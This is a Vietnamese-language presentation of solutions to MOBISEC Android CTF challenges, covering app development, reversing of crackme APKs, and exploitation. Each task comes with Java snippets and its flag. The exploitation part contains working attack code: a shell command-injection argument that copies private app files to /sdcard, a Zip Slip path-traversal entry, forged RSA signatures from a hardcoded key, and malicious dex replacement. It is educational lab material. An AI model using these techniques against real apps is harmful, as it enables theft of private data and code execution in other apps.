# MOBISEC Presentation - AppDev, Reversing, Exploitation

Tai lieu nay viet theo kieu thuyet trinh, giai thich chi tiet hon tung bai. Moi code block co duong dan file goc.

## AppDev

### helloword
- Muc tieu: log chuoi "hello-world-mobisec-edition" voi tag "MOBISEC".
- Phan tich: bai nay chi can tao Activity hop le va goi logging API. Khong can UI.
- Cach lam chi tiet:
  - Tao MainActivity ke thua AppCompatActivity.
  - Trong onCreate, goi Log.i voi tag va message dung yeu cau.
  - Khong can setContentView (van pass trong bai nay).
- File: `appdev/helloword/app/src/main/java/com/example/myapplication/MainActivity.java`
```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    Log.i("MOBISEC", "hello-world-mobisec-edition");
}
```
- Flag: `MOBISEC{here_there_is_your_first_and_last_charity_point}`

### justlisten
- Muc tieu: lang nghe broadcast `com.mobisec.intent.action.FLAG_ANNOUNCEMENT` va log extra `flag`.
- Phan tich: can mot BroadcastReceiver va phai dang ky theo vong doi Activity de khong leak.
- Cach lam chi tiet:
  - Tao FlagReceiver extends BroadcastReceiver va xu ly onReceive.
  - Register receiver trong onStart va unregister trong onStop.
  - Kiem tra action dung roi moi doc extra "flag".
- File: `appdev/justlisten/app/src/main/java/com/example/myapplication/MainActivity.java`
```java
@Override
protected void onStart() {
    super.onStart();
    flagReceiver = new FlagReceiver();
    IntentFilter filter = new IntentFilter(FlagReceiver.ACTION_FLAG);
    registerReceiver(flagReceiver, filter);
}
```
- File: `appdev/justlisten/app/src/main/java/com/example/myapplication/FlagReceiver.java`
```java
@Override
public void onReceive(Context context, Intent intent) {
    if (ACTION_FLAG.equals(intent.getAction())) {
        String flag = intent.getStringExtra("flag");
        Log.i("MOBISEC", "Received flag: " + flag);
    }
}
```
- Flag: `MOBISEC{not_sure_Ive_heard_well_what_did_ya_say?!?}`

### reachingout
- Muc tieu: GET form, parse val1/oper/val2, tinh toan va POST tra loi de lay flag.
- Phan tich: server tra HTML co input hidden. Can parse nhanh bang string search.
- Cach lam chi tiet:
  - Tao thread nen de goi mang (khong lam tren UI thread).
  - GET `http://10.0.2.2:31337/flag`, doc HTML ve string.
  - Parse value cua cac input id=val1/oper/val2.
  - Tinh toan theo oper (+,-,*,/) va POST ket qua ve /flag.
  - Doc response va log flag.
- File: `appdev/reachingout/app/src/main/java/com/example/myapplication/MainActivity.java`
```java
String val1 = extractValue(html, "val1");
String oper = extractValue(html, "oper");
String val2 = extractValue(html, "val2");

HttpURLConnection postConn = (HttpURLConnection) postUrl.openConnection();
postConn.setRequestMethod("POST");
postConn.setDoOutput(true);
```
- Flag: `MOBISEC{I_was_told_by_liars_that_http_queries_were_easy}`

### justask
- Muc tieu: goi 4 activity va ghep 4 manh flag (co nested Bundle).
- Phan tich: moi Activity tra ve du lieu khac nhau, phai xu ly tung case.
- Cach lam chi tiet:
  - Goi PartOne, PartTwo, PartThree, PartFour theo thu tu.
  - Moi lan nhan onActivityResult, doc dung key:
    - Part1: extra "flag"
    - Part2: extra "flag"
    - Part3: extra "hiddenFlag"
    - Part4: extra "follow" (Bundle long nhau)
  - Dung de quy de tim String trong Bundle.
  - Ghep cac manh lai va log.
- File: `appdev/justask/app/src/main/java/com/example/myapplication/MainActivity.java`
```java
Intent i = new Intent();
i.setClassName("com.mobisec.justask", "com.mobisec.justask.PartOne");
startActivityForResult(i, REQ_1);
```
- File: `appdev/justask/app/src/main/java/com/example/myapplication/MainActivity.java`
```java
private String findStringDeep(Bundle b) {
    for (String k : b.keySet()) {
        Object v = b.get(k);
        if (v instanceof String) return (String) v;
        if (v instanceof Bundle) {
            String inner = findStringDeep((Bundle) v);
            if (inner != null) return inner;
        }
    }
    return null;
}
```
- Flag: `MOBISEC{Ive_asked_and_I_got_the_flag_how_nice!}`

### filehasher
- Muc tieu: nhan intent HASHFILE, tinh SHA-256 cua file va tra ve extra "hash".
- Phan tich: Activity duoc goi bang implicit intent, can xu ly ca onCreate va onNewIntent.
- Cach lam chi tiet:
  - Kiem tra action `com.mobisec.intent.action.HASHFILE`.
  - Lay Uri tu intent.getData().
  - Dung ContentResolver.openInputStream doc file va MessageDigest SHA-256.
  - PutExtra("hash", hashHex) vao result Intent, setResult(RESULT_OK), finish().
- File: `appdev/filehasher/app/src/main/java/com/example/myapplication/MainActivity.java`
```java
Uri fileUri = intent.getData();
String hashHex = computeSha256OfUri(fileUri);
Intent resultIntent = new Intent();
resultIntent.putExtra("hash", hashHex);
setResult(Activity.RESULT_OK, resultIntent);
```
- Flag: `MOBISEC{Was_it_known_that_these_one_way_functions_give_you_back_flags?}`

### whereareyou
- Muc tieu: service lay location va broadcast lai.
- Phan tich: can Service exported, nhan action GIMMELOCATION, sau do broadcast Location.
- Cach lam chi tiet:
  - Tao LocationService extends Service.
  - Trong onStartCommand, getLastKnownLocation tu GPS/NETWORK.
  - Neu null, requestSingleUpdate va broadcast khi co location.
  - Tao Intent action `com.mobisec.intent.action.LOCATION_ANNOUNCEMENT` va putExtra("location", loc).
- File: `appdev/whereareyou/app/src/main/java/com/mobisec/myapplication/LocationService.java`
```java
Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
if (loc == null) {
    loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
}
if (loc != null) {
    broadcastLocation(loc);
}
```
- Flag: `MOBISEC{Where_are_you_bro?_Will_not_tell_anybody_I_swear}`

### jokeprovider
- Muc tieu: query ContentProvider va ghep jokes cua author "reyammer".
- Phan tich: ContentProvider tra ve Cursor, can loc theo author.
- Cach lam chi tiet:
  - Dung URI `content://com.mobisec.provider.Joke/jokes`.
  - Query voi selection "author = ?" va args {"reyammer"}.
  - Duyet Cursor, lay column "joke" va append.
  - Log flag sau khi ghep.
- File: `appdev/jokeprovider/app/src/main/java/com/mobisec/myapplication/MainActivity.java`
```java
Cursor c = getContentResolver().query(
        JOKES_URI,
        null,
        "author = ?",
        new String[]{"reyammer"},
        null
);
```
- Flag: `MOBISEC{lol_roftl_ahahah_:D_REYAMMER_TELLS_THE_BEST_JOKES!}`

### unbindable
- Muc tieu: bind den UnbindableService va xin flag qua Messenger.
- Phan tich: can ServiceConnection, Messenger tu IBinder, gui MSG_GET_FLAG.
- Cach lam chi tiet:
  - Tao ServiceConnection onServiceConnected.
  - Tao remoteMessenger = new Messenger(service).
  - Tao replyMessenger dung Handler de nhan message.
  - Send MSG_REGISTER_CLIENT va MSG_GET_FLAG.
  - Trong handler, neu msg.what == MSG_GET_FLAG thi doc Bundle "flag".
- File: `appdev/unbindable/app/src/main/java/com/mobisec/myapplication/MainActivity.java`
```java
remoteMessenger = new Messenger(service);
replyMessenger  = new Messenger(new IncomingHandler());
Message getFlag = Message.obtain(null, MSG_GET_FLAG);
getFlag.replyTo = replyMessenger;
remoteMessenger.send(getFlag);
```
- Flag: `MOBISEC{please_respect_my_will_you_shall_not_bind_me_my_friend}`

### serialintent
- Muc tieu: nhan Serializable FlagContainer va goi private getFlag() bang reflection.
- Phan tich: object Serializable co method private, can getDeclaredMethod.
- Cach lam chi tiet:
  - startActivityForResult toi SerialActivity.
  - Nhap extra "flag" va cast FlagContainer.
  - Reflection: getDeclaredMethod("getFlag"), setAccessible(true), invoke.
  - Log flag.
- File: `appdev/serialintent/app/src/main/java/com/mobisec/myapplication/MainActivity.java`
```java
FlagContainer fc = (FlagContainer) data.getSerializableExtra("flag");
Method m = fc.getClass().getDeclaredMethod("getFlag");
m.setAccessible(true);
String flag = (String) m.invoke(fc);
```
- Flag: `MOBISEC{HOW_DID_YOU_DO_IT_THAT_WAS_SERIALLY_PRIVATE_STUFF1!!1!eleven!}`

### flagextractor
- Muc tieu: goi SerialActivity, ghep cac phan theo perm, Base64 decode ra flag.
- Phan tich: FlagContainer chua parts va perm. Can ghep theo thu tu perm roi decode.
- Cach lam chi tiet:
  - Lay fc.parts va fc.perm tu Intent extra.
  - Duyet i=0..n-1, append parts[perm[i]] vao StringBuilder.
  - Base64 decode chuoi ghep va log.
- File: `appdev/flagextractor/app/src/main/java/com/mobisec/flagextractor/MainActivity.java`
```java
ArrayList<Integer> perm = fc.perm;
String[] parts = fc.parts;
StringBuilder b64 = new StringBuilder();
for (int i = 0; i < parts.length; i++) {
    b64.append(parts[perm.get(i)]);
}
String flag = new String(Base64.decode(b64.toString(), Base64.DEFAULT));
```

## Reversing

### babyrev
- Muc tieu: giai checkFlag gom format, ROT13, regex xen ke chu hoa/thuong.
- Phan tich chi tiet:
  - Check format MOBISEC{...} va length = 35.
  - Co dieu kien charAt voi hang so (getX/getY/getZ) => rut gon index.
  - Substring 18..23 sau ROT13 phai la "REALLY".
  - Suffix lay tu resources: last_part = "ver_cisab_" => reverse -> "_basic_rev".
  - Regex getR yeu cau xen ke [A-Z_] va [a-z_].
- Cach lam chi tiet:
  - Thay the hang so, suy ra cac ky tu co dinh.
  - Chon casing phu hop regex xen ke.
  - Ghep tat ca rang buoc de ra flag.
- File: `reversing/babyrev/babyrev.txt`
```java
public static boolean checkFlag(Context ctx, String flag) {
    if (!flag.startsWith("MOBISEC{") || flag.length() != 35) {
        return false;
    }
    String r = getR();
    return flag.substring(8, flag.length() - 1).matches(r);
}
```
- Flag: `MOBISEC{ThIs_iS_A_ReAlLy_bAsIc_rEv}`

### gnirts
- Muc tieu: tach core, split theo ky tu giau, doi chieu hash tung phan.
- Phan tich chi tiet:
  - Flag co core 32 ky tu, split thanh 5 phan.
  - Ky tu separator duoc sinh boi foo() (10 lan Base64 decode).
  - Check ky tu tai 4 vi tri tong ASCII = 180 => '-' (45*4).
  - Moi phan co rang buoc: ps0 lowercase, ps2 uppercase, ps4 digits.
  - Hash algorithm va digest duoc obfuscate (XOR + reflection). Ket qua la so sanh hash.
- Cach lam chi tiet:
  - Tim separator = '-'.
  - Giai cac hash t1..t5 va brute force tung phan theo rang buoc.
  - Kiem tra hash cua toan bo flag voi t6.
- File: `reversing/gnirts/grints.txt`
```java
if (!flag.startsWith("MOBISEC{") || !flag.endsWith("}")) return false;
String core = flag.substring(8, 40);
String[] ps = core.split(foo());
```
- Flag: `MOBISEC{peppa-9876543-BAAAM-A1z9-3133337}`

### goingnative
- Muc tieu: mot phan check nam trong native lib (JNI).
- Phan tich chi tiet:
  - Java chi kiem tra format va goi native helloFromTheOtherSide(left, pin).
  - Native kiem tra left == "native_is_so" va pin == 31337.
  - Java yeu cau right la 6 digit => dung "031337".
- Cach lam chi tiet:
  - Decompile Java, tim native method.
  - Extract libnative-lib.so va disassemble de tim hang so.
  - Ket hop rang buoc format de ghep flag.
- File: `reversing/goingnative/goingnative.txt`
```java
if (strArrSplit.length != 2) return false;
String left = strArrSplit[0].replace("MOBISEC{", "");
String right = strArrSplit[1].replace("}", "");
return helloFromTheOtherSide(left, Integer.parseInt(right));
```
- Flag: `MOBISEC{native_is_so-031337}`

### loadme
- Muc tieu: dinh vi chuoi ma hoa (url, class, method), download dex, XOR, DexClassLoader.
- Phan tich chi tiet:
  - ds() giai ma AES-CBC, key dua tren package name.
  - gu/gf/gc/gm giai ra URL, ten file, class va method.
  - dc() download file, da() XOR decrypt bang package name.
  - lc() load class va invoke method.
- Cach lam chi tiet:
  - Giai ds() de ra URL stage1.apk va class/method.
  - Download stage1, XOR decrypt, decompile tiep.
  - Stage1 load tiep payload tu resource (logo.png) -> giai ma -> flag.
- File: `reversing/loadme/loadme.md`
```java
String url = ds("MAi9CEe4K9a+JzgsNqdYYh13dk7SQQ/yo5BN5HF39nYtgnOBmO4EV9Y2sQDthTG9");
DexClassLoader classloader = new DexClassLoader(
        file.getAbsolutePath(), tmpDir.getAbsolutePath(), null,
        ClassLoader.getSystemClassLoader());
```
- Flag: `MOBISEC{dynamic_code_loading_can_make_everything_tricky_eh?}`

### pincode
- Muc tieu: tim PIN 6 so sao cho MD5 lap 10,000 lan trung hash.
- Phan tich chi tiet:
  - PinChecker lam 25*400 vong MD5 tren pinBytes.
  - So sanh hex hash voi hang so `d04988522ddfed3133cc24fb6924eae9`.
  - Space 1,000,000 => brute force duoc.
- Cach lam chi tiet:
  - Viet script brute force 000000..999999.
  - Moi pin: lap MD5 10,000 lan, so sanh hex.
  - PIN dung la 703958, goi endpoint lay flag.
- File: `reversing/pincode/pincode.txt`
```java
byte[] pinBytes = pin.getBytes();
for (int i = 0; i < 25; i++) {
    for (int j = 0; j < 400; j++) {
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(pinBytes);
        pinBytes = md.digest();
    }
}
```
- Flag: `MOBISEC{local_checks_can_be_very_bad_for_security}`

### blockchain
- Muc tieu: key space 3 byte (MD5) + 10 vong AES-ECB.
- Phan tich chi tiet:
  - Key that: digest[0], digest[8], digest[15] => 24-bit.
  - Moi vong: AES-ECB encrypt, sau do key = MD5(key).
  - Cuoi cung so sanh hex ciphertext voi hang so dai.
- Cach lam chi tiet:
  - Brute force 3-byte key, build chain 10 key (MD5 l?p).
  - Decrypt nguoc 10 vong tu ciphertext.
  - Check plaintext co dang MOBISEC{...}.
- File: `reversing/blockchain/blockchain.md`
```java
byte[] key = {digest[0], digest[digest.length / 2], digest[digest.length - 1]};
byte[] currKey = hash(key);
byte[] newPt = encrypt(currPt, currKey);
```
- Flag: `MOBISEC{blockchain_failed_to_deliver_once_again}`

### upos
- Muc tieu: checkFlag bi lam roi decompiler; can smali patch de doc logic.
- Phan tich chi tiet:
  - JADX bi fail do fake throw va try/catch lam mat CFG.
  - FC.checkFlag dung matrix 256x256 tu assets/lotto.dat.
  - Ham r() la ROT-like, sq() tao so tu 2 ky tu va binh phuong.
  - Streamer (LFSR) sinh chuoi (x,y) de doi chieu voi matrix.
- Cach lam chi tiet:
  - Apktool decompile, patch smali: thay `throw` bang `goto`.
  - Decompile lai, rut ra thu tu step LFSR.
  - Precompute map: value -> pair (2 ky tu) = sq(r(pair)).
  - Simulate LFSR, lay m[x][y], map nguoc ra chuoi.
  - Kiem tra SHA-256 cua flag.
- File: `reversing/upos/upos.txt`
```java
public static String r(String s) {
    String out = "";
    for (int i = 0; i < s.length(); i++) {
        char c = s.charAt(i);
        if (c >= 'a' && c <= 's') c = (char) (c + 7);
        else if (c >= 't' && c <= 'z') c = (char) (c - 19);
        out = out + c;
    }
    return out;
}
```
- Flag: `MOBISEC{Isnt_this_a_truly_evil_undebuggable_piece_of_sh^W_software??}`

## Exploitation

### frontdoor
- Muc tieu: goi HTTP endpoint voi credential hardcoded, log ket qua.
- Phan tich chi tiet:
  - Trong target APK co hardcode username/password va URL.
  - Chi can replicate request GET va log response.
- Cach lam chi tiet:
  - Tao thread nen.
  - HttpURLConnection GET toi `10.0.2.2:31337/getflag`.
  - Doc body va Log.e tag "MOBISEC".
- File: `exploitation/frontdoor/app/src/main/java/com/mobisec/myapplication/MainActivity.java`
```java
String urlStr = "http://10.0.2.2:31337/getflag?username=testuser&password=passtestuser123";
HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
conn.setRequestMethod("GET");
```
- Flag: `MOBISEC{noob_hackers_only_check_for_backdoors}`

### nojumpstarts
- Muc tieu: ky authmsg bang private key hardcoded va goi activity C.
- Phan tich chi tiet:
  - Activity A/B/C kiem tra authmsg + authsign.
  - RSA private key nam trong APK => co the tu ky.
- Cach lam chi tiet:
  - Copy PRIVKEY tu target.
  - Sign chuoi "Main-to-A/A-to-B/B-to-C" bang SHA256withRSA.
  - Start activity C (exported) voi authmsg + authsign.
  - Doc result extra "flag".
- File: `exploitation/nojumpstarts/app/src/main/java/com/mobisec/myapplication/MainActivity.java`
```java
String msg = "Main-to-A/A-to-B/B-to-C";
byte[] sig = sign(msg);
Intent i = new Intent();
i.setClassName("com.mobisec.nojumpstarts", "com.mobisec.nojumpstarts.C");
i.putExtra("authmsg", msg);
i.putExtra("authsign", sig);
```
- Flag: `MOBISEC{you_shall_not_jump_ok?pretty_please?}`

### keyboard
- Muc tieu: Zip Slip ghi de GlobalKeyboardPrefs.xml de bat debugmode.
- Phan tich chi tiet:
  - Target unzip update.zip tu /sdcard ma khong kiem tra path.
  - Chen entry voi ../../.. de ghi vao /data/data/.../shared_prefs.
  - Bat debugmode -> app log flag.
- Cach lam chi tiet:
  - Tao update.zip voi entry `../../../data/data/com.mobisec.keyboard/shared_prefs/GlobalKeyboardPrefs.xml`.
  - Ghi noi dung XML debugmode=true.
  - Drop update.zip vao /sdcard, cho target extract.
- File: `exploitation/keyboard/app/src/main/java/com/mobisec/keyboardexploit/MainActivity.java`
```java
String globPrefsPath = "../../../data/data/com.mobisec.keyboard/shared_prefs/GlobalKeyboardPrefs.xml";
ZipEntry e1 = new ZipEntry(globPrefsPath);
zos.putNextEntry(e1);
zos.write(globPrefsXml);
```
- Flag: `MOBISEC{the_more_emoji_a_keyboard_has_the_more_secure_it_is}`

### filebrowser
- Muc tieu: PendingIntent + command injection de copy keys.xml va LogDb, sau do giai AES.
- Phan tich chi tiet:
  - PluginActivity tra ve PendingIntent de goi QueryActivity.
  - QueryActivity ghep oper + arg vao shell command -> injection.
  - Co the copy /data/data/... ra /sdcard.
- Cach lam chi tiet:
  - Lay PendingIntent tu PluginActivity.
  - Send fill-in intent voi extra oper="ls" va arg chua chuoi `; cp ...`.
  - Copy keys.xml va LogDb (+wal/+shm) ra /sdcard.
  - Parse key trong keys.xml, AES key = MD5(key).
  - Tim row oper="genflag" (encrypted), decrypt arg -> flag.
- File: `exploitation/TB/filebrowser/app/src/main/java/com/mobisec/filebrowserexploit/MainActivity.java`
```java
String arg = ">/dev/null 2>&1; " +
        "cp /data/data/com.mobisec.filebrowser/shared_prefs/keys.xml /sdcard/keys.xml; " +
        "cp /data/data/com.mobisec.filebrowser/databases/LogDb /sdcard/LogDb; ";
fill.putExtra("oper", "ls");
fill.putExtra("arg", arg);
```
- Flag: `MOBISEC{a_good_file_browser_would_gimme_the_flag_with_no_hacks}`

### fortnite
- Muc tieu: thay the dex va sign.dat tren /sdcard de payload chay trong process target.
- Phan tich chi tiet:
  - Target download fortnite.dex + sign.dat ra /sdcard.
  - Kiem tra SHA-256(dex) == sign.dat, sau do DexClassLoader load Payload.run().
  - External storage writable => co the replace ca dex va sign.
- Cach lam chi tiet:
  - Build payload dex chi chua class `com.mobisec.fortnitepayload.Payload`.
  - Write dex len /sdcard/fortnite.dex va hash vao /sdcard/sign.dat.
  - Lap lai nhieu lan de thang race (target download moi giay).
  - Payload doc flag tu Intent hoac static field `MainActivity.flag`, gui ve app exploit.
- File: `exploitation/TB/fornite/app/src/main/java/com/mobisec/fortniteexploit/MainActivity.java`
```java
String sha256Hex = writeDexFromAssets(dexOut, ASSET_DEX);
writeString(signOut, sha256Hex);
```
- File: `exploitation/TB/payload/src/main/java/com/mobisec/fortnitepayload/Payload.java`
```java
Class<?> c = Class.forName("com.mobisec.fortnite.MainActivity", false, ctx.getClassLoader());
Field f = c.getDeclaredField("flag");
f.setAccessible(true);
String s = String.valueOf(f.get(null));
```
- Flag: `MOBISEC{players_gonna_play_mobisec_hackers_gonna_mobisec_it_up}`
